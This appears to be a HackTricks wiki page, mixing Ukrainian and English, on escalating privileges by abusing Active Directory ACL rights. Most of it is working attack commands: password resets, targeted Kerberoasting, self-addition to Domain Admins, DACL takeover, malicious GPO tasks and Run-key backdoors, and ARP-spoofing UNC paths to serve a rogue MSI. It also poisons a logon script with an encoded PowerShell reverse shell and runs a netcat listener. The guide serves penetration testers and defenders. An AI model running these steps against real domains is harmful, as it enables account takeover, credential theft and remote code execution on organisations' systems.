# Abusing Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**This page is mostly a summary of the techniques from** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **and** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. For more details, check the original articles.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Rights on User**

Цей привілей надає атакувальнику повний контроль над цільовим обліковим записом користувача. Після підтвердження прав `GenericAll` за допомогою команди `Get-ObjectAcl`, атакувальник може:

- **Change the Target's Password**: Використовуючи `net user <username> <password> /domain`, атакувальник може скинути пароль користувача.
- From Linux, you can do the same over SAMR with Samba `net rpc`:
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Якщо обліковий запис вимкнено, очистіть прапорець UAC**: `GenericAll` allows editing `userAccountControl`. From Linux, BloodyAD can remove the `ACCOUNTDISABLE` flag:
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Призначте SPN до облікового запису користувача, щоб зробити його kerberoastable, потім використайте Rubeus і targetedKerberoast.py, щоб витягнути та спробувати зламати хеші ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Вимкніть pre-authentication для користувача, зробивши його обліковий запис вразливим до ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Маючи `GenericAll` на користувачі, ви можете додати сертифікатно-базовані credentials і автентифікуватися як він без зміни його пароля. Дивіться:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **GenericAll Rights on Group**

Цей привілей дозволяє атакувальнику змінювати memberships групи, якщо він має `GenericAll` rights на групу на кшталт `Domain Admins`. Після визначення distinguished name групи за допомогою `Get-NetGroup`, атакувальник може:

- **Add Themselves to the Domain Admins Group**: Це можна зробити через direct commands або використовуючи modules на кшталт Active Directory або PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- З Linux ви також можете використати BloodyAD, щоб додати себе до довільних груп, якщо у вас є GenericAll/Write membership над ними. Якщо цільова група вкладена в “Remote Management Users”, ви негайно отримаєте доступ до WinRM на хостах, що враховують цю групу:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Маючи ці привілеї на об’єкті computer або обліковому записі user, можна:

- **Kerberos Resource-based Constrained Delegation**: Дозволяє захопити об’єкт computer.
- **Shadow Credentials**: Використайте цю техніку, щоб видавати себе за обліковий запис computer або user, експлуатуючи привілеї для створення shadow credentials.

## **WriteProperty on Group**

Якщо user має права `WriteProperty` на всі об’єкти для певної групи (наприклад, `Domain Admins`), він може:

- **Add Themselves to the Domain Admins Group**: Це досягається шляхом поєднання команд `net user` і `Add-NetGroupUser`; цей метод дозволяє підвищити привілеї в domain.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Цей привілей дає змогу attackers додавати себе до певних груп, таких як `Domain Admins`, через команди, що безпосередньо змінюють membership групи. Використання такої послідовності команд дозволяє self-addition:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Подібне привілею, це дозволяє attackers напряму додавати себе до груп, змінюючи властивості груп, якщо вони мають право `WriteProperty` на ці groups. Підтвердження та виконання цього привілею здійснюються за допомогою:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Наявність `ExtendedRight` на користувача для `User-Force-Change-Password` дозволяє скидати пароль без знання поточного пароля. Перевірку цього права та його використання можна виконати через PowerShell або альтернативні command-line tools, що пропонують кілька методів скидання пароля користувача, включно з interactive sessions і one-liners для non-interactive environments. Команди варіюються від простих викликів PowerShell до використання `rpcclient` на Linux, демонструючи універсальність attack vectors.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner on Group**

Якщо атакувальник виявляє, що має права `WriteOwner` над group, він може змінити власника group на себе. Це особливо впливає, коли йдеться про `Domain Admins`, оскільки зміна власника надає ширший контроль над атрибутами group і membership. Процес передбачає визначення правильного object за допомогою `Get-ObjectAcl`, а потім використання `Set-DomainObjectOwner` для зміни owner, або через SID, або через name.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite на User**

Цей дозвіл дає змогу зловмиснику змінювати властивості користувача. Зокрема, маючи доступ `GenericWrite`, зловмисник може змінити шлях до logon script користувача, щоб виконувати шкідливий script під час входу користувача в систему. Це досягається за допомогою команди `Set-ADObject` для оновлення властивості `scriptpath` цільового користувача так, щоб вона вказувала на script зловмисника.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

За цим privilege attackers можуть маніпулювати group membership, наприклад додаючи себе або інших users до specific groups. Цей process involves створення credential object, using it to add or remove users from a group, and verifying the membership changes with PowerShell commands.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- З Linux, Samba `net` може додавати/видаляти членів, коли у вас є `GenericWrite` на групі (корисно, коли PowerShell/RSAT недоступні):
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Володіння AD object і наявність привілеїв `WriteDACL` на ньому дає attacker можливість надати собі привілеї `GenericAll` над object. Це досягається через ADSI manipulation, що дозволяє отримати full control над object і можливість змінювати його group memberships. Попри це, існують limitations під час спроб exploit цих привілеїв за допомогою cmdlets `Set-Acl` / `Get-Acl` модуля Active Directory.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner швидке захоплення (PowerView)

Коли у вас є `WriteOwner` і `WriteDacl` над користувачем або service account, ви можете отримати повний контроль і скинути його password за допомогою PowerView без знання старого password:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Примітки:
- Вам може знадобитися спочатку змінити власника на себе, якщо у вас є лише `WriteOwner`:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Validate access with any protocol (SMB/LDAP/RDP/WinRM) after password reset.

## **Replication on the Domain (DCSync)**

The DCSync attack leverages specific replication permissions on the domain to mimic a Domain Controller and synchronize data, including user credentials. This powerful technique requires permissions like `DS-Replication-Get-Changes`, allowing attackers to extract sensitive information from the AD environment without direct access to a Domain Controller. [**Learn more about the DCSync attack here.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Delegated access to manage Group Policy Objects (GPOs) can present significant security risks. For instance, if a user such as `offense\spotless` is delegated GPO management rights, they may have privileges like **WriteProperty**, **WriteDacl**, and **WriteOwner**. These permissions can be abused for malicious purposes, as identified using PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumerate GPO Permissions

To identify misconfigured GPOs, PowerSploit's cmdlets can be chained together. This allows for the discovery of GPOs that a specific user has permissions to manage: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computers with a Given Policy Applied**: It's possible to resolve which computers a specific GPO applies to, helping understand the scope of potential impact. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policies Applied to a Given Computer**: To see what policies are applied to a particular computer, commands like `Get-DomainGPO` can be utilized.

**OUs with a Given Policy Applied**: Identifying organizational units (OUs) affected by a given policy can be done using `Get-DomainOU`.

You can also use the tool [**GPOHound**](https://github.com/cogiceo/GPOHound) to enumerate GPOs and find issues in them.

### Abuse GPO - New-GPOImmediateTask

Misconfigured GPOs can be exploited to execute code, for example, by creating an immediate scheduled task. This can be done to add a user to the local administrators group on affected machines, significantly elevating privileges:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Модуль GroupPolicy, якщо встановлений, дає змогу створювати та прив’язувати нові GPO, а також задавати preferences, такі як registry values, щоб запускати backdoors на уражених комп’ютерах. Цей метод вимагає, щоб GPO було оновлено, а користувач увійшов у computer для виконання:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse пропонує спосіб abuse наявних GPO шляхом додавання tasks або зміни налаштувань без потреби створювати нові GPO. Цей інструмент вимагає модифікації наявних GPO або використання інструментів RSAT для створення нових перед застосуванням змін:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Force Policy Update

Оновлення GPO зазвичай відбуваються приблизно кожні 90 хвилин. Щоб прискорити цей процес, особливо після внесення змін, на цільовому комп’ютері можна використати команду `gpupdate /force`, щоб примусово виконати негайне оновлення policy. Ця команда гарантує, що будь-які зміни в GPOs буде застосовано без очікування наступного автоматичного циклу оновлення.

### Under the Hood

Під час перегляду Scheduled Tasks для певного GPO, наприклад `Misconfigured Policy`, можна підтвердити додавання таких task, як `evilTask`. Ці task створюються через scripts або command-line tools, щоб змінювати поведінку system або підвищувати privileges.

Структура task, як показано в XML configuration file, згенерованому `New-GPOImmediateTask`, описує деталі scheduled task — зокрема command, який буде виконано, і його triggers. Цей file показує, як scheduled tasks визначаються та керуються всередині GPOs, і надає спосіб виконувати arbitrary commands або scripts як частину policy enforcement.

### Users and Groups

GPOs також дозволяють змінювати membership користувачів і groups на цільових system. Безпосередньо редагуючи policy files Users and Groups, attackers можуть додавати користувачів до privileged groups, таких як local `administrators` group. Це можливо завдяки делегуванню GPO management permissions, яке дозволяє змінювати policy files, щоб додавати нових користувачів або змінювати group memberships.

XML configuration file для Users and Groups описує, як ці зміни реалізуються. Додаючи записи до цього file, конкретним користувачам можна надати elevated privileges на affected systems. Цей метод пропонує прямий підхід до privilege escalation через маніпуляцію GPO.

Крім того, додаткові методи виконання code або збереження persistence, такі як використання logon/logoff scripts, зміна registry keys для autoruns, встановлення software через .msi files або редагування service configurations, також можуть бути використані. Ці techniques надають різні шляхи для збереження доступу та контролю над target systems через abuse of GPOs.

### WriteGPLink + UNC path hijacking (ARP spoofing)

`WriteGPLink` через OU/domain дозволяє змінювати атрибут `gPLink` цільового container і **force existing GPO to apply** без редагування самого GPO. Це стає особливо цікавим, коли пов’язаний GPO вже посилається на remote content через **UNC paths** (`\\HOST\share\...`), оскільки authenticated users можуть читати **SYSVOL** і шукати повторно придатні policies offline.

High-level workflow:

1. Use BloodHound to identify a principal with `WriteGPLink` over an OU and enumerate computers/users inside that OU.
2. Clone `SYSVOL` read-only and parse GPOs looking for **Software Installation**, **drive mappings** (`Drives.xml`), and **logon/startup scripts** that reference UNC paths.
3. Prefer policies pointing to a **direct hostname** (for example `\\DC02\share\pkg.msi`) instead of DFS/domain-namespace paths, because hostname-based paths are easier to redirect with L2 spoofing.
4. Append the chosen GPO GUID to the target OU's `gPLink` so the victim processes that already-existing policy.
5. On the same broadcast domain, ARP spoof the UNC host and bind its IP locally (`ip addr add <target_ip>/32 dev <iface>`) so the victim's SMB traffic reaches your host.
6. Serve the expected path/filename from an attacker SMB server (for example `smbserver.py`) and wait for normal policy processing.

Example `SYSVOL` collection and GPO correlation:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
Підв’яжіть наявний GPO до цільового OU:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

Якщо пов’язаний GPO розгортає MSI з UNC path, client отримає його під час **computer startup** і встановить як **`NT AUTHORITY\SYSTEM`**. Підмінивши referenced host і віддаючи malicious MSI з **тим самим share/path/name**, ви можете перетворити **`WriteGPLink`** на SYSTEM code execution **без модифікації SYSVOL**.

Important constraints:

- **Timing matters**: новий link видно під час policy refresh (зазвичай ~90 minutes), але **Software Installation** зазвичай спрацьовує на **reboot**.
- Windows Installer commonly відстежує deployment через package **`ProductCode`**. Якщо product already installed, deployment може бути пропущено.
- Щоб уникнути installer rejection, patch rogue MSI так, щоб його **`ProductCode`** і **`PackageCode`** збігалися з legitimate package, який очікує GPO.
- Старі `.aas` advertisement files можуть залишатися в **SYSVOL**, тож переконайтеся, що deployment і далі виглядає active, перш ніж покладатися на нього.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

GPP drive mappings in `Drives.xml` змушують користувачів автентифікуватися до налаштованого UNC path під час logon або повторного підключення. Якщо підробити згаданий host, можна перехопити **NetNTLMv2**. Якщо SMB навмисно зробити таким, що він зазнає fail, Windows може повторити спробу через **WebDAV**, надсилаючи **NTLM over HTTP**, що набагато гнучкіше для relay до **LDAP(S)**, **AD CS**, або **SMB**.

#### Logon/startup script UNC hijack

Такий самий pattern застосовується до UNC-hosted scripts, виявлених у `SYSVOL`:

- **Logon scripts** зазвичай виконуються в контексті **user**.
- **Startup scripts** зазвичай виконуються в контексті **computer / SYSTEM**.

Якщо script path вказує на hostname, який можна підробити, перенаправте UNC host і віддавайте replacement script content з очікуваного location.

## SYSVOL/NETLOGON Logon Script Poisoning

Writable paths під `\\<dc>\SYSVOL\<domain>\scripts\` або `\\<dc>\NETLOGON\` дозволяють змінювати logon scripts, які виконуються під час user logon через GPO. Це дає code execution у security context користувачів, що входять у систему.

### Locate logon scripts
- Перевірте user attributes на налаштований logon script:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Проскануйте domain shares, щоб знайти ярлики або посилання на скрипти:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Розбирайте `.lnk` files, щоб визначати targets, що вказують у SYSVOL/NETLOGON (корисний DFIR trick і для attackers без direct GPO access):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound відображає атрибут `logonScript` (scriptPath) на вузлах користувачів, коли він присутній.

### Validate write access (don’t trust share listings)
Автоматизовані інструменти можуть показувати SYSVOL/NETLOGON як read-only, але базові NTFS ACL усе ще можуть дозволяти запис. Завжди перевіряйте:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Якщо розмір файлу або mtime змінюється, у вас є write. Збережіть originals перед модифікацією.

### Poison a VBScript logon script for RCE
Append a command that launches a PowerShell reverse shell (generate from revshells.com) and keep original logic to avoid breaking business function:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Слухайте на вашому хості й чекайте на наступний інтерактивний вхід:
```bash
rlwrap -cAr nc -lnvp 443
```
Примітки:
- Виконання відбувається під токеном користувача, що увійшов у систему, (не SYSTEM). Область дії — GPO link (OU, site, domain), до якого застосовується цей script.
- Після використання виконайте cleanup, відновивши оригінальний вміст/timestamps.


## References

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [Samba – net rpc (group membership)](https://www.samba.org/)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [TrustedSec - ARP Around and Find Out: Hijacking GPO UNC Paths for Code Execution and NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)

{{#include ../../../banners/hacktricks-training.md}}
